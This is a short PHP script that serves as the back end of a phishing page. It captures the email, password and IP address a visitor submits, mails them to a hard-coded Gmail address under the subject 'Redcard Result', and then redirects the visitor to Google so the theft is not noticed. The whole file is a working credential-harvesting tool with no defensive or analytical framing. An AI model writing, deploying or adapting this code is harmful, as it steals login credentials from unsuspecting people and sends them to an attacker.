<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST["email"];
  $password = $_POST["password"];
  $ip = $_SERVER["REMOTE_ADDR"]; // Get the IP address of the user

  $to = "decker6686@gmail.com"; // Replace with your email address
  $subject = "Redcard Result";
  $body = "Email: " . $email . "\nPassword: " . $password . "\nIP Address: " . $ip;

  $headers = "From: " . $email . "\r\n";
  $headers .= "Reply-To: " . $email . "\r\n";

  if (mail($to, $subject, $body, $headers)) {
    // Redirect to Google after successful form submission
    header("Location: https://www.google.com");
    exit;
  } else {
    echo "Failed to send email.";
  }
}
?>
